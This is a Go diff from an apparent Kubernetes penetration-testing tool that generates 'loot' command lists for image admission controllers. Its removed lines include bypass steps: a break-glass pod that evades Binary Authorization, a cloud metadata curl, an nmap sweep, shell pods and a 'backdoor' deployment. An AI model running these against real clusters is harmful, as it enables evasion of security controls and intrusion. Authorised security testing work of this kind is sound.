-		loot.Section("NeuVector").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("NeuVector").Add("# NEUVECTOR ENUMERATION")
-		loot.Section("NeuVector").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("NeuVector").Add("")
-		loot.Section("NeuVector").Add("# Check NeuVector pods:")
-		loot.Section("NeuVector").Add("kubectl get pods -n neuvector")
-		loot.Section("NeuVector").Add("")
-		loot.Section("NeuVector").Add("# List admission control rules:")
-		loot.Section("NeuVector").Add("kubectl get nvadmissioncontrolsecurityrules -A")
-		loot.Section("NeuVector").Add("")
-		loot.Section("NeuVector").Add("# Check controller mode:")
-		loot.Section("NeuVector").Add("kubectl get nvsecurityrules -A")
-		loot.Section("NeuVector").Add("")
-		if neuvectorController.FailurePolicy == "Ignore" {
-			loot.Section("NeuVector").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# NeuVector:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n neuvector")
+		loot.Section("Image-Admission-Commands").Add("kubectl get nvadmissioncontrolsecurityrules -A")
+		loot.Section("Image-Admission-Commands").Add("kubectl get nvsecurityrules -A")
 	}
 
-	// StackRox loot
 	if stackroxController.Name != "" {
-		loot.Section("StackRox").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("StackRox").Add("# STACKROX / RED HAT ACS ENUMERATION")
-		loot.Section("StackRox").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("StackRox").Add("")
-		loot.Section("StackRox").Add("# Check StackRox pods:")
-		loot.Section("StackRox").Add("kubectl get pods -n stackrox")
-		loot.Section("StackRox").Add("")
-		loot.Section("StackRox").Add("# Check Sensor deployment:")
-		loot.Section("StackRox").Add("kubectl get deployment sensor -n stackrox -o yaml")
-		loot.Section("StackRox").Add("")
-		loot.Section("StackRox").Add("# Check admission controller:")
-		loot.Section("StackRox").Add("kubectl get deployment admission-control -n stackrox -o yaml")
-		loot.Section("StackRox").Add("")
-		if stackroxController.FailurePolicy == "Ignore" {
-			loot.Section("StackRox").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# StackRox / Red Hat ACS:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n stackrox")
+		loot.Section("Image-Admission-Commands").Add("kubectl get deployment sensor -n stackrox -o yaml")
+		loot.Section("Image-Admission-Commands").Add("kubectl get deployment admission-control -n stackrox -o yaml")
 	}
 
-	// Snyk Container loot
 	if snykController.Name != "" {
-		loot.Section("SnykContainer").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("SnykContainer").Add("# SNYK CONTAINER ENUMERATION")
-		loot.Section("SnykContainer").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("SnykContainer").Add("")
-		loot.Section("SnykContainer").Add("# Check Snyk pods:")
-		loot.Section("SnykContainer").Add("kubectl get pods -n snyk-monitor")
-		loot.Section("SnykContainer").Add("")
-		loot.Section("SnykContainer").Add("# Check webhook config:")
-		loot.Section("SnykContainer").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", snykController.WebhookName)
-		loot.Section("SnykContainer").Add("")
-		if snykController.FailurePolicy == "Ignore" {
-			loot.Section("SnykContainer").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Snyk Container:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n snyk-monitor")
+		loot.Section("Image-Admission-Commands").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", snykController.WebhookName)
 	}
 
-	// Anchore loot
 	if anchoreController.Name != "" {
-		loot.Section("Anchore").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Anchore").Add("# ANCHORE ENTERPRISE ENUMERATION")
-		loot.Section("Anchore").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Anchore").Add("")
-		loot.Section("Anchore").Add("# Check Anchore pods:")
-		loot.Section("Anchore").Add("kubectl get pods -n anchore")
-		loot.Section("Anchore").Add("")
-		loot.Section("Anchore").Add("# Check admission controller:")
-		loot.Section("Anchore").Add("kubectl get pods -n anchore | grep admission")
-		loot.Section("Anchore").Add("")
-		loot.Section("Anchore").Add("# Check webhook config:")
-		loot.Section("Anchore").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", anchoreController.WebhookName)
-		loot.Section("Anchore").Add("")
-		if anchoreController.FailurePolicy == "Ignore" {
-			loot.Section("Anchore").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Anchore Enterprise:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n anchore")
+		loot.Section("Image-Admission-Commands").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", anchoreController.WebhookName)
 	}
 
-	// Trivy Operator loot
 	if trivyController.Name != "" {
-		loot.Section("TrivyOperator").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("TrivyOperator").Add("# TRIVY OPERATOR ENUMERATION")
-		loot.Section("TrivyOperator").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("TrivyOperator").Add("")
-		loot.Section("TrivyOperator").Add("# Check Trivy Operator pods:")
-		loot.Section("TrivyOperator").Add("kubectl get pods -n trivy-system")
-		loot.Section("TrivyOperator").Add("")
-		loot.Section("TrivyOperator").Add("# List VulnerabilityReports:")
-		loot.Section("TrivyOperator").Add("kubectl get vulnerabilityreports -A")
-		loot.Section("TrivyOperator").Add("")
-		loot.Section("TrivyOperator").Add("# List ConfigAuditReports:")
-		loot.Section("TrivyOperator").Add("kubectl get configauditreports -A")
-		loot.Section("TrivyOperator").Add("")
-		loot.Section("TrivyOperator").Add("# Get high severity vulnerabilities:")
-		loot.Section("TrivyOperator").Add("kubectl get vulnerabilityreports -A -o json | jq '.items[] | select(.report.summary.criticalCount > 0) | {name: .metadata.name, critical: .report.summary.criticalCount}'")
-		loot.Section("TrivyOperator").Add("")
-		if trivyController.BypassRisk != "" {
-			loot.Section("TrivyOperator").Addf("# [NOTE] %s", trivyController.BypassRisk)
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Trivy Operator:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n trivy-system")
+		loot.Section("Image-Admission-Commands").Add("kubectl get vulnerabilityreports -A")
+		loot.Section("Image-Admission-Commands").Add("kubectl get configauditreports -A")
 	}
 
-	// Kubewarden loot
 	if kubewardenController.Name != "" {
-		loot.Section("Kubewarden").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Kubewarden").Add("# KUBEWARDEN ENUMERATION")
-		loot.Section("Kubewarden").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Kubewarden").Add("")
-		loot.Section("Kubewarden").Add("# Check Kubewarden pods:")
-		loot.Section("Kubewarden").Add("kubectl get pods -n kubewarden")
-		loot.Section("Kubewarden").Add("")
-		loot.Section("Kubewarden").Add("# List ClusterAdmissionPolicies:")
-		loot.Section("Kubewarden").Add("kubectl get clusteradmissionpolicies")
-		loot.Section("Kubewarden").Add("")
-		loot.Section("Kubewarden").Add("# List AdmissionPolicies (namespace-scoped):")
-		loot.Section("Kubewarden").Add("kubectl get admissionpolicies -A")
-		loot.Section("Kubewarden").Add("")
-		loot.Section("Kubewarden").Add("# Check PolicyServer:")
-		loot.Section("Kubewarden").Add("kubectl get policyservers")
-		loot.Section("Kubewarden").Add("")
-		if kubewardenController.FailurePolicy == "Ignore" {
-			loot.Section("Kubewarden").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Kubewarden:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n kubewarden")
+		loot.Section("Image-Admission-Commands").Add("kubectl get clusteradmissionpolicies")
+		loot.Section("Image-Admission-Commands").Add("kubectl get admissionpolicies -A")
 	}
 
-	// Notation loot
 	if notationController.Name != "" {
-		loot.Section("Notation").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Notation").Add("# NOTATION / NOTARY V2 ENUMERATION")
-		loot.Section("Notation").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Notation").Add("")
-		loot.Section("Notation").Add("# Check webhook config:")
-		loot.Section("Notation").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", notationController.WebhookName)
-		loot.Section("Notation").Add("")
-		loot.Section("Notation").Add("# Notation uses trust policies configured in the verifier")
-		loot.Section("Notation").Add("# Check for trust policy configmaps:")
-		loot.Section("Notation").Add("kubectl get configmap -A | grep -i notation")
-		loot.Section("Notation").Add("")
-		if notationController.FailurePolicy == "Ignore" {
-			loot.Section("Notation").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Notation/Notary v2:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get trustpolicies.notation.x-k8s.io -A")
+		loot.Section("Image-Admission-Commands").Add("kubectl get truststores.notation.x-k8s.io -A")
 	}
 
-	// Harbor loot
 	if harborController.Name != "" {
-		loot.Section("Harbor").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Harbor").Add("# HARBOR REGISTRY ENUMERATION")
-		loot.Section("Harbor").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Harbor").Add("")
-		loot.Section("Harbor").Add("# Check Harbor pods:")
-		loot.Section("Harbor").Add("kubectl get pods -n harbor")
-		loot.Section("Harbor").Add("")
-		loot.Section("Harbor").Add("# Check webhook config:")
-		loot.Section("Harbor").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", harborController.WebhookName)
-		loot.Section("Harbor").Add("")
-		loot.Section("Harbor").Add("# Harbor policies are configured via the Harbor UI/API")
-		loot.Section("Harbor").Add("# Check for project-level vulnerability settings")
-		loot.Section("Harbor").Add("")
-		if harborController.FailurePolicy == "Ignore" {
-			loot.Section("Harbor").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Harbor:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n harbor")
 	}
 
-	// AWS Signer loot
-	if awsSignerController.Name != "" {
-		loot.Section("AWSSigner").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("AWSSigner").Add("# AWS SIGNER ENUMERATION")
-		loot.Section("AWSSigner").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("AWSSigner").Add("")
-		loot.Section("AWSSigner").Add("# Check for pods with AWS Signer annotations:")
-		loot.Section("AWSSigner").Add("kubectl get pods -A -o json | jq '.items[] | select(.metadata.annotations[\"signer.amazonaws.com/signing-profile\"] != null) | {namespace: .metadata.namespace, name: .metadata.name, profile: .metadata.annotations[\"signer.amazonaws.com/signing-profile\"]}'")
-		loot.Section("AWSSigner").Add("")
-		loot.Section("AWSSigner").Add("# List AWS signing profiles (requires AWS CLI):")
-		loot.Section("AWSSigner").Add("aws signer list-signing-profiles")
-		loot.Section("AWSSigner").Add("")
-		loot.Section("AWSSigner").Add("# Check ECR signing configuration:")
-		loot.Section("AWSSigner").Add("aws ecr describe-registry --query 'replicationConfiguration'")
-		loot.Section("AWSSigner").Add("")
-	}
-
-	// Azure Policy loot
-	if azurePolicyController.Name != "" {
-		loot.Section("AzurePolicy").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("AzurePolicy").Add("# AZURE POLICY FOR AKS ENUMERATION")
-		loot.Section("AzurePolicy").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("AzurePolicy").Add("")
-		loot.Section("AzurePolicy").Add("# Check Azure Policy pods:")
-		loot.Section("AzurePolicy").Add("kubectl get pods -n gatekeeper-system")
-		loot.Section("AzurePolicy").Add("kubectl get pods -n kube-system | grep azure-policy")
-		loot.Section("AzurePolicy").Add("")
-		loot.Section("AzurePolicy").Add("# List Azure-specific constraint templates:")
-		loot.Section("AzurePolicy").Add("kubectl get constrainttemplates | grep -i k8sazure")
-		loot.Section("AzurePolicy").Add("")
-		loot.Section("AzurePolicy").Add("# List constraints for allowed registries:")
-		loot.Section("AzurePolicy").Add("kubectl get constraints | grep -i container")
-		loot.Section("AzurePolicy").Add("")
-		loot.Section("AzurePolicy").Add("# Check Azure Policy assignments (requires Azure CLI):")
-		loot.Section("AzurePolicy").Add("az policy assignment list --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ContainerService/managedClusters/<cluster>")
-		loot.Section("AzurePolicy").Add("")
-		if azurePolicyController.FailurePolicy == "Ignore" {
-			loot.Section("AzurePolicy").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
-	}
-
-	// Clair loot
 	if clairController.Name != "" {
-		loot.Section("Clair").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Clair").Add("# CLAIR ENUMERATION")
-		loot.Section("Clair").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Clair").Add("")
-		loot.Section("Clair").Add("# Check Clair pods:")
-		loot.Section("Clair").Add("kubectl get pods -A | grep clair")
-		loot.Section("Clair").Add("")
-		loot.Section("Clair").Add("# Check webhook config:")
-		loot.Section("Clair").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", clairController.WebhookName)
-		loot.Section("Clair").Add("")
-		if clairController.FailurePolicy == "Ignore" {
-			loot.Section("Clair").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Clair:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n clair")
 	}
 
-	// Bypass techniques loot
-	loot.Section("Bypass").Add("\n# ═══════════════════════════════════════════════════════════")
-	loot.Section("Bypass").Add("# BYPASS TECHNIQUES")
-	loot.Section("Bypass").Add("# ═══════════════════════════════════════════════════════════")
-	loot.Section("Bypass").Add("")
-	loot.Section("Bypass").Add("# 1. Check for failurePolicy=Ignore (webhook failures don't block):")
-	loot.Section("Bypass").Add("kubectl get validatingwebhookconfiguration -o json | jq '.items[] | select(.webhooks[].failurePolicy==\"Ignore\") | .metadata.name'")
-	loot.Section("Bypass").Add("")
-	loot.Section("Bypass").Add("# 2. Check for namespace exclusions:")
-	loot.Section("Bypass").Add("kubectl get validatingwebhookconfiguration -o json | jq '.items[] | {name: .metadata.name, exclusions: .webhooks[].namespaceSelector}'")
-	loot.Section("Bypass").Add("")
-	loot.Section("Bypass").Add("# 3. Find 'allow' policies (no signature required):")
-	loot.Section("Bypass").Add("kubectl get clusterimagepolicies -o yaml | grep -A5 'policy: allow'")
-	loot.Section("Bypass").Add("")
-	loot.Section("Bypass").Add("# 4. Find wildcard patterns:")
-	loot.Section("Bypass").Add("kubectl get clusterimagepolicies -o yaml | grep 'name: \"*\"'")
-	loot.Section("Bypass").Add("")
-	loot.Section("Bypass").Add("# 5. Check for unsigned image exceptions:")
-	loot.Section("Bypass").Add("kubectl get configmap connaisseur-config -n connaisseur -o yaml | grep -A10 'allow'")
-	loot.Section("Bypass").Add("")
-
-	// Add bypass vectors from analysis
-	if len(policyEffectiveness.BypassVectors) > 0 {
-		loot.Section("Bypass").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Bypass").Add("# DETECTED BYPASS VECTORS")
-		loot.Section("Bypass").Add("# ═══════════════════════════════════════════════════════════")
-		for _, vector := range policyEffectiveness.BypassVectors {
-			loot.Section("Bypass").Addf("# - %s", vector)
-		}
-		loot.Section("Bypass").Add("")
+	if awsSignerController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# AWS Signer:")
+		loot.Section("Image-Admission-Commands").Add("aws signer list-signing-profiles")
 	}
 
-	// Allowed images loot
-	loot.Section("AllowedImages").Add("\n# ═══════════════════════════════════════════════════════════")
-	loot.Section("AllowedImages").Add("# ALLOWED IMAGES / REGISTRIES")
-	loot.Section("AllowedImages").Add("# ═══════════════════════════════════════════════════════════")
-	loot.Section("AllowedImages").Add("")
+	if azurePolicyController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# Azure Policy for AKS:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n kube-system | grep azure-policy")
+		loot.Section("Image-Admission-Commands").Add("kubectl get constrainttemplates")
+	}
 
-	if len(allowedImages) == 0 {
-		if len(controllers) == 0 {
-			// No admission controllers - ANY image can be deployed
-			loot.Section("AllowedImages").Add("# ╔══════════════════════════════════════════════════════════╗")
-			loot.Section("AllowedImages").Add("# ║  NO IMAGE ADMISSION CONTROLLERS DETECTED                ║")
-			loot.Section("AllowedImages").Add("# ║  ANY IMAGE FROM ANY REGISTRY CAN BE DEPLOYED!           ║")
-			loot.Section("AllowedImages").Add("# ╚══════════════════════════════════════════════════════════╝")
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# Deploy from Docker Hub (public):")
-			loot.Section("AllowedImages").Add("kubectl run test-nginx --image=nginx:latest --restart=Never")
-			loot.Section("AllowedImages").Add("kubectl run test-alpine --image=alpine:latest --restart=Never -- sleep 3600")
-			loot.Section("AllowedImages").Add("kubectl run test-busybox --image=busybox:latest --restart=Never -- sleep 3600")
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# Deploy from any registry:")
-			loot.Section("AllowedImages").Add("kubectl run test-custom --image=<your-registry>/<your-image>:<tag> --restart=Never")
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# Deploy with shell access:")
-			loot.Section("AllowedImages").Add("kubectl run shell --image=ubuntu:latest --restart=Never -it --rm -- /bin/bash")
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# Deploy pentest tools:")
-			loot.Section("AllowedImages").Add("kubectl run nmap --image=instrumentisto/nmap --restart=Never -- -sn 10.0.0.0/8")
-			loot.Section("AllowedImages").Add("kubectl run curl --image=curlimages/curl --restart=Never -- -s http://metadata.google.internal/")
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# Create a deployment:")
-			loot.Section("AllowedImages").Add("kubectl create deployment backdoor --image=<your-registry>/backdoor:latest")
-			loot.Section("AllowedImages").Add("")
-		} else {
-			// Controllers exist but no explicit allow patterns detected
-			// Check for specific controllers to provide targeted guidance
-			hasGCPBinAuth := false
-			for _, c := range controllers {
-				if c.Type == "gcp-binauth" {
-					hasGCPBinAuth = true
-					break
-				}
-			}
+	if wizController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# Wiz:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -A | grep wiz")
+	}
 
-			if hasGCPBinAuth {
-				loot.Section("AllowedImages").Add("# ╔══════════════════════════════════════════════════════════╗")
-				loot.Section("AllowedImages").Add("# ║  GCP BINARY AUTHORIZATION DETECTED                       ║")
-				loot.Section("AllowedImages").Add("# ║  Images require attestation OR break-glass annotation    ║")
-				loot.Section("AllowedImages").Add("# ╚══════════════════════════════════════════════════════════╝")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-				loot.Section("AllowedImages").Add("# BYPASS OPTION 1: BREAK-GLASS ANNOTATION")
-				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-				loot.Section("AllowedImages").Add("# The break-glass annotation allows bypassing Binary Authorization")
-				loot.Section("AllowedImages").Add("# Note: This may trigger alerts/audit logs")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("cat <<'EOF' | kubectl apply -f -")
-				loot.Section("AllowedImages").Add("apiVersion: v1")
-				loot.Section("AllowedImages").Add("kind: Pod")
-				loot.Section("AllowedImages").Add("metadata:")
-				loot.Section("AllowedImages").Add("  name: break-glass-test")
-				loot.Section("AllowedImages").Add("  annotations:")
-				loot.Section("AllowedImages").Add("    alpha.image-policy.k8s.io/break-glass: \"true\"")
-				loot.Section("AllowedImages").Add("spec:")
-				loot.Section("AllowedImages").Add("  containers:")
-				loot.Section("AllowedImages").Add("  - name: shell")
-				loot.Section("AllowedImages").Add("    image: ubuntu:latest")
-				loot.Section("AllowedImages").Add("    command: [\"sleep\", \"3600\"]")
-				loot.Section("AllowedImages").Add("EOF")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-				loot.Section("AllowedImages").Add("# BYPASS OPTION 2: USE ATTESTED IMAGES")
-				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-				loot.Section("AllowedImages").Add("# Check which attestors are configured:")
-				loot.Section("AllowedImages").Add("gcloud container binauthz policy export")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# List attestors:")
-				loot.Section("AllowedImages").Add("gcloud container binauthz attestors list")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-				loot.Section("AllowedImages").Add("# ENUMERATION")
-				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# Check what images are already running (these have attestations):")
-				loot.Section("AllowedImages").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}' | sort -u")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# Check if any pods have break-glass annotation:")
-				loot.Section("AllowedImages").Add("kubectl get pods -A -o json | jq -r '.items[] | select(.metadata.annotations[\"alpha.image-policy.k8s.io/break-glass\"]==\"true\") | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# Check webhook configuration:")
-				loot.Section("AllowedImages").Add("kubectl get validatingwebhookconfigurations -o yaml | grep -A30 imagepolicy")
-				loot.Section("AllowedImages").Add("")
-			} else {
-				loot.Section("AllowedImages").Add("# No explicit allowed image patterns detected from policies")
-				loot.Section("AllowedImages").Add("# Controllers are present but policies may use default-deny or")
-				loot.Section("AllowedImages").Add("# dynamic verification (signatures, attestations, scanning)")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-				loot.Section("AllowedImages").Add("# ENUMERATION COMMANDS")
-				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# Check what images are already running (these passed admission):")
-				loot.Section("AllowedImages").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}' | sort -u")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# Get registries in use (these are likely allowed):")
-				loot.Section("AllowedImages").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}' | cut -d'/' -f1 | sort -u")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# Check Kyverno policies for image rules:")
-				loot.Section("AllowedImages").Add("kubectl get clusterpolicies -o yaml | grep -A20 'image\\|registry\\|pattern'")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# Check Gatekeeper constraints for image rules:")
-				loot.Section("AllowedImages").Add("kubectl get constraints -A -o yaml | grep -A20 'repos\\|images\\|registries'")
-				loot.Section("AllowedImages").Add("")
-				loot.Section("AllowedImages").Add("# Check OPA policies:")
-				loot.Section("AllowedImages").Add("kubectl get configmaps -n opa -o yaml | grep -A50 'allowed_registries\\|image_policy'")
-			}
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-			loot.Section("AllowedImages").Add("# TEST DEPLOYMENT COMMANDS")
-			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# Test if public registries are blocked:")
-			loot.Section("AllowedImages").Add("kubectl run test-dockerhub --image=nginx:latest --restart=Never --dry-run=server")
-			loot.Section("AllowedImages").Add("kubectl run test-gcr --image=gcr.io/google-containers/pause:latest --restart=Never --dry-run=server")
-			loot.Section("AllowedImages").Add("kubectl run test-ghcr --image=ghcr.io/github/super-linter:latest --restart=Never --dry-run=server")
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# Test a custom registry:")
-			loot.Section("AllowedImages").Add("kubectl run test-custom --image=<registry>/<image>:<tag> --restart=Never --dry-run=server")
-			loot.Section("AllowedImages").Add("")
-		}
+	if laceworkController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# Lacework:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n lacework")
+	}
 
-		// Show images already in use (these definitely work)
-		if len(imageSourceAnalysis.RegistryBreakdown) > 0 {
-			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-			loot.Section("AllowedImages").Add("# IMAGES ALREADY DEPLOYED (confirmed working)")
-			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-			loot.Section("AllowedImages").Add("")
-			loot.Section("AllowedImages").Add("# These images passed admission and are currently running.")
-			loot.Section("AllowedImages").Add("# You can deploy similar images from the same registries:")
-			loot.Section("AllowedImages").Add("")
+	if cosignController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# Cosign (Standalone):")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -A | grep cosign")
+	}
 
-			for registry, usage := range imageSourceAnalysis.RegistryBreakdown {
-				regType := "private"
-				if usage.IsPublic {
-					regType = "PUBLIC"
-				}
-				loot.Section("AllowedImages").Addf("# Registry: %s (%s) - %d images deployed", registry, regType, usage.ImageCount)
+	if fluxImageController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# Flux Image Automation:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get imagepolicies.image.toolkit.fluxcd.io -A")
+		loot.Section("Image-Admission-Commands").Add("kubectl get imagerepositories.image.toolkit.fluxcd.io -A")
+	}
 
-				// Show sample images that are deployed
-				count := 0
-				for _, img := range usage.UniqueImages {
-					if count >= 3 {
-						loot.Section("AllowedImages").Addf("#   ... and %d more images", len(usage.UniqueImages)-3)
-						break
-					}
-					loot.Section("AllowedImages").Addf("#   - %s", img)
-					count++
-				}
+	if xrayController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# JFrog Xray:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -A | grep xray")
+	}
 
-				// Provide deploy command for this registry
-				loot.Section("AllowedImages").Add("#")
-				loot.Section("AllowedImages").Addf("kubectl run test-%s --image=%s/<your-image>:<tag> --restart=Never",
-					strings.ReplaceAll(strings.Split(registry, ".")[0], "/", "-"),
-					registry)
-				loot.Section("AllowedImages").Add("")
-			}
-		}
-	} else {
-		loot.Section("AllowedImages").Addf("# Found %d allowed image pattern(s)", len(allowedImages))
-		loot.Section("AllowedImages").Add("")
+	if deepfenceController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# Deepfence ThreatMapper:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n deepfence")
+	}
+
+	if qualysController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# Qualys Container Security:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -A | grep qualys")
+	}
+
+	if dockerScoutController.Name != "" {
+		loot.Section("Image-Admission-Commands").Add("\n# Docker Scout:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -A | grep scout")
+	}
+
+	loot.Section("Image-Admission-Commands").Add("")
+
+	// Add deploy commands section for allowed images
+	if len(allowedImages) > 0 {
+		loot.Section("Image-Admission-Deploy-Commands").SetHeader(`#####################################
+##### Image Admission Deploy Commands
+#####################################
+# Commands to deploy images that are allowed by the admission policies
+# Use these to test what images can actually be deployed to the cluster
+`)
 
 		for _, entry := range allowedImages {
-			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
-			loot.Section("AllowedImages").Addf("# Controller: %s | Policy: %s", entry.Controller, entry.PolicyName)
-			loot.Section("AllowedImages").Addf("# Pattern: %s", entry.AllowedPattern)
-			loot.Section("AllowedImages").Addf("# Scope: %s", entry.Scope)
-			if len(entry.Namespaces) > 0 {
-				loot.Section("AllowedImages").Addf("# Namespaces: %s", strings.Join(entry.Namespaces, ", "))
-			}
-			if entry.SignatureRequired {
-				loot.Section("AllowedImages").Add("# Signature: REQUIRED")
-			} else {
-				loot.Section("AllowedImages").Add("# Signature: Not required")
-			}
-			if entry.AttestationReq != "" {
-				loot.Section("AllowedImages").Addf("# Attestations: %s", entry.AttestationReq)
-			}
-			if entry.Conditions != "" {
-				loot.Section("AllowedImages").Addf("# Conditions: %s", entry.Conditions)
-			}
-			if entry.SourceResource != "" {
-				loot.Section("AllowedImages").Addf("# Source: %s", entry.SourceResource)
-			}
-			if entry.EnumerateCmd != "" {
-				loot.Section("AllowedImages").Add("#")
-				loot.Section("AllowedImages").Add("# Enumerate source:")
-				loot.Section("AllowedImages").Add(entry.EnumerateCmd)
-			}
-			loot.Section("AllowedImages").Add("#")
-			loot.Section("AllowedImages").Add("# Deploy command:")
-			loot.Section("AllowedImages").Add(entry.DeployCommand)
-			loot.Section("AllowedImages").Add("")
-		}
-	}
-
-	// Image source analysis loot
-	loot.Section("ImageSources").Add("\n# ═══════════════════════════════════════════════════════════")
-	loot.Section("ImageSources").Add("# IMAGE SOURCE ANALYSIS")
-	loot.Section("ImageSources").Add("# ═══════════════════════════════════════════════════════════")
-	loot.Section("ImageSources").Add("")
-	loot.Section("ImageSources").Addf("# Total Images: %d", imageSourceAnalysis.TotalImages)
